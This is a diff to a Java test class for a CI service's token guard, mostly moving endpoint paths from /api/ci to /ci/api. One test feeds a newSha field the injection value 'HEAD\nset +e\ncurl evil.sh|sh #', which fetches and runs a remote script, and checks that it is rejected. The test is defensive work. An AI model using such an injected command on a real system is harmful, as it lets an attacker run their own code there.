@@ -48,7 +48,7 @@ public class CiTokenGuardTest {
         .contentType(ContentType.JSON)
         .body(EVENT)
         .when()
-        .post("/api/ci/events/post-receive")
+        .post("/ci/api/events/post-receive")
         .then()
         .statusCode(401);
   }
@@ -60,7 +60,7 @@ public class CiTokenGuardTest {
         .header("X-CI-Token", "not-the-token")
         .body(EVENT)
         .when()
-        .post("/api/ci/events/post-receive")
+        .post("/ci/api/events/post-receive")
         .then()
         .statusCode(401);
   }
@@ -73,14 +73,14 @@ public class CiTokenGuardTest {
         .header("X-CI-Token", TOKEN)
         .body(EVENT)
         .when()
-        .post("/api/ci/events/post-receive")
+        .post("/ci/api/events/post-receive")
         .then()
         .statusCode(202);
   }
 
   @Test
   public void readsAreNotTokenGuarded() {
-    given().when().get("/api/ci/repositories/some-repo/runs").then().statusCode(200);
+    given().when().get("/ci/api/runs?repositoryId=some-repo").then().statusCode(200);
   }
 
   @Test
@@ -97,7 +97,7 @@ public class CiTokenGuardTest {
                 "oldSha", "0".repeat(40),
                 "newSha", "HEAD\nset +e\ncurl evil.sh|sh #"))
         .when()
-        .post("/api/ci/events/post-receive")
+        .post("/ci/api/events/post-receive")
         .then()
         .statusCode(400);
   }
